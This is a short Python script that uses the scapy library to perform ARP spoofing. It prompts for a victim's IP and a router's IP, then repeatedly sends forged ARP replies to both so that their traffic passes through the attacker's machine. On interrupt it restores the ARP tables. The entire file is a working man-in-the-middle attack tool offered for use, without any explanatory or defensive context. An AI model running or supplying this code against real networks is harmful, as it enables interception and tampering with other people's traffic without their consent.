#! /usr/bin/python3

from scapy.all import *
import time
import sys

def get_mac(ip):
	arp = ARP(pdst=ip)
	ether = Ether(dst="ff:ff:ff:ff:ff:ff")
	broadcast_pkt = ether/arp

	out_array = srp(broadcast_pkt,timeout=1,verbose=False)[0]
	return out_array[0][1].hwsrc

def restore_arptable(source_ip,destination_ip):
	source_mac = get_mac(source_ip)
	destination_mac = get_mac(destination_ip)

	ether = Ether()
	ether.dst = destination_mac
	ether.src = source_mac

	arp = ARP()
	arp.op = 2
	arp.pdst = destination_ip
	arp.hwdst = destination_mac
	arp.psrc = source_ip
	arp.hwsrc = source_mac

	pkt = ether/arp 
	sendp(pkt,count=4,verbose=False)


def spoof(target_ip,spoof_ip):
	target_mac = get_mac(target_ip)

	ether=Ether()
	ether.dst=target_mac

	arp = ARP()
	arp.op = 2
	arp.pdst = target_ip
	arp.hwdst = target_mac
	arp.psrc = spoof_ip

	pkt = ether/arp
	sendp(pkt,verbose=False)
	#sendp(Ether(dst=target_mac)/ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip))
	#send(pkt)


if __name__ == "__main__":
	tip = input("Enter ip of the victim : ")
	rip = input("Enter ip of the router to spoof: ")
	ctr=0
	try:
		while True:
			spoof(tip,rip)
			spoof(rip,tip)
			ctr = ctr + 2
			#print("\rCount of packets sent: " + str(ctr)),
			print(f"\rPackets send: {ctr}", end="", flush=True)
			#sys.stdout.flush()
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n[+] Ctrl+C detected --- Quitting")
		restore_arptable(tip,rip)
		restore_arptable(rip,tip)





